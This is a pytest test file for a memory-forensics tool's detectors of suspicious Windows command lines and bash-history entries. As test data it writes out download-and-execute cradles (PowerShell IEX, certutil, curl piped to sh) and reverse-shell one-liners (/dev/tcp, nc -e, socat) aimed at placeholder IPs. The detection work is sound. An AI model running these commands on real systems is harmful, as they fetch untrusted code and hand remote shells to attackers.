# ruff: noqa: E501 - test data tables (long literal command lines, paths and regions)
"""Command-line (Windows) and shell-history (Linux) detectors, including masking of the quoted
text (RT13)."""

from typing import Any

import pytest
from cyberlab_jobs.memory import MemoryProfile

from dataset.baselines import LINUX_HISTORY, WIN, Draft, bash
from dataset.scenarios import LIMITS
from memory_worker import detections
from memory_worker.detections import cmdline as cmdline_rules
from memory_worker.detections import shell
from memory_worker.view import DetectionOutput

IMAGE: dict[str, Any] = {
    "kind": "image",
    "size_bytes": 1024,
    "sha256": "c" * 64,
    "layer": "WindowsIntel32e",
    "arch": "x64",
    "system_time": "2026-11-01T10:00:00Z",
}


def windows(cmd: str, name: str = "cmd.exe") -> DetectionOutput:
    d = Draft(os="windows", profile=MemoryProfile.TRIAGE, image=dict(IMAGE))
    d.add_process(3040, 2900, "explorer.exe", "C:\\Windows\\explorer.exe", 5)
    d.add_process(7000, 3040, name, WIN + name, 9, cmdline=cmd)
    return detections.run(d.view(), LIMITS)


def linux(*commands: str) -> DetectionOutput:
    d = Draft(os="linux", profile=MemoryProfile.TRIAGE, image=dict(IMAGE, layer="LimeLayer"))
    d.add_process(1030, 1, "bash", None, 1, cmdline="-bash", sources=("pslist",))
    d.artifacts += [bash(1030, c, 2 + i) for i, c in enumerate(commands)]
    return detections.run(d.view(), LIMITS)


ENC = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="


@pytest.mark.parametrize(
    ("cmd", "name", "label", "severity"),
    [
        (f"powershell.exe -enc {ENC}", "powershell.exe", "powershell_encoded_command", "medium"),
        (
            f"powershell -EncodedCommand {ENC}",
            "powershell.exe",
            "powershell_encoded_command",
            "medium",
        ),
        (f"pwsh -ec {ENC}", "pwsh.exe", "powershell_encoded_command", "medium"),
        (
            "powershell -nop -w hidden -c Get-Date",
            "powershell.exe",
            "powershell_hidden_window",
            "low",
        ),
        (
            "powershell -WindowStyle Hidden -File x.ps1",
            "powershell.exe",
            "powershell_hidden_window",
            "low",
        ),
        (
            "powershell IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/a')",
            "powershell.exe",
            "powershell_download_cradle",
            "medium",
        ),
        (
            "powershell iwr http://198.51.100.5/a | Invoke-Expression",
            "powershell.exe",
            "powershell_download_cradle",
            "medium",
        ),
        (
            "certutil.exe -urlcache -split -f http://198.51.100.12/p.exe p.exe",
            "certutil.exe",
            "certutil_urlcache",
            "medium",
        ),
        (
            "bitsadmin /transfer job /download /priority high http://198.51.100.3/a.exe C:\\a.exe",
            "bitsadmin.exe",
            "bitsadmin_transfer",
            "medium",
        ),
        ("mshta http://198.51.100.4/a.hta", "mshta.exe", "mshta_remote", "medium"),
        (
            'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)',
            "rundll32.exe",
            "rundll32_javascript",
            "medium",
        ),
        (
            "regsvr32 /s /n /u /i:http://198.51.100.6/a.sct scrobj.dll",
            "regsvr32.exe",
            "regsvr32_remote_scriptlet",
            "medium",
        ),
        ("wmic process call create calc.exe", "wmic.exe", "wmic_process_create", "low"),
    ],
)
def test_each_pattern(cmd: str, name: str, label: str, severity: str) -> None:
    out = windows(cmd, name)
    assert [(f.type, f.severity) for f in out.findings] == [("mem_suspicious_cmdline", severity)]
    assert label in str(out.findings[0].attributes["patterns"])


def test_two_weak_patterns_are_medium() -> None:
    out = windows('powershell -w hidden -c "wmic process call create notepad"', "powershell.exe")
    assert out.findings[0].severity == "medium"


@pytest.mark.parametrize(
    "cmd",
    [
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inventory.ps1",
        "powershell -ep bypass -file x.ps1",
        "certutil -hashfile C:\\x.iso SHA256",
        "bitsadmin /list /allusers",
        "mshta.exe C:\\Windows\\help.hta",
        "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        "regsvr32 /s C:\\Program Files\\App\\comp.dll",
        "wmic process list brief",
        "cmd.exe /c echo -enc is not powershell here SQBFAFgAIAAoAE4AZQB3AC0ATwBi",
    ],
)
def test_benign_command_lines(cmd: str) -> None:
    assert windows(cmd).findings == []


def test_quoted_command_line_is_masked() -> None:
    out = windows(
        "cmd /c net use \\\\fs\\c$ /user:CORP\\admin Winter2026!Pw && wmic /password:Winter2026!Pw process call create x"
    )
    text = out.findings[0].title + out.findings[0].description
    assert "Winter2026!Pw" not in text and "Wi***********(13)" in text


def test_long_command_line_is_shortened() -> None:
    out = windows("certutil -urlcache -f http://198.51.100.12/" + "a" * 3000)
    description = out.findings[0].description
    assert "a" * cmdline_rules.QUOTE_LIMIT not in description and "..." in description


# --- bash history ---------------------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "label"),
    [
        ("curl -s http://198.51.100.7/x.sh | sh", "download_piped_to_shell"),
        ("wget -qO- http://198.51.100.7/x | sudo bash", "download_piped_to_shell"),
        ("wget http://198.51.100.9/a -O /tmp/a && chmod +x /tmp/a", "download_then_chmod"),
        ("curl -o /tmp/b http://198.51.100.9/b; chmod 755 /tmp/b", "download_then_chmod"),
        ("bash -i >& /dev/tcp/198.51.100.8/4444 0>&1", "dev_tcp_redirect"),
        ("nc -e /bin/sh 198.51.100.8 4444", "netcat_exec"),
        ("ncat --exec /bin/bash 198.51.100.8 4444", "netcat_exec"),
        (
            "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.8\",4444))'",
            "python_socket_one_liner",
        ),
        ("socat tcp:198.51.100.8:4444 exec:/bin/sh", "socat_exec"),
    ],
)
def test_each_shell_pattern(command: str, label: str) -> None:
    assert label in shell.matches(command)
    out = linux(command)
    assert [(f.type, f.severity, f.attributes["pid"]) for f in out.findings] == [
        ("mem_shell_history_pattern", "medium", 1030)
    ]


def test_benign_history_is_silent() -> None:
    assert linux(*LINUX_HISTORY).findings == []


def test_history_line_is_masked_in_the_finding() -> None:
    out = linux("sshpass -p 'Tr0ub4dor&3' ssh root@10.0.0.31 \"curl http://198.51.100.9/a | sh\"")
    text = out.findings[0].title + out.findings[0].description
    assert "Tr0ub4dor&3" not in text and "Tr*********(11)" in text


def test_shell_rules_do_not_run_on_windows() -> None:
    d = Draft(os="windows", profile=MemoryProfile.TRIAGE, image=dict(IMAGE))
    d.artifacts.append(bash(1, "curl http://198.51.100.7/x | sh", 1))
    assert detections.run(d.view(), LIMITS).findings == []


def test_cmdline_rules_do_not_run_on_linux() -> None:
    d = Draft(os="linux", profile=MemoryProfile.TRIAGE, image=dict(IMAGE, layer="LimeLayer"))
    d.add_process(10, 1, "sh", None, 1, cmdline=f"powershell -enc {ENC}", sources=("pslist",))
    assert detections.run(d.view(), LIMITS).findings == []


def test_ps_rules_need_powershell() -> None:
    assert cmdline_rules.matches(f"cmd /c -enc {ENC}", powershell=False) == []
    assert [p.label for p in cmdline_rules.matches(f"x -enc {ENC}", powershell=True)] == [
        "powershell_encoded_command"
    ]
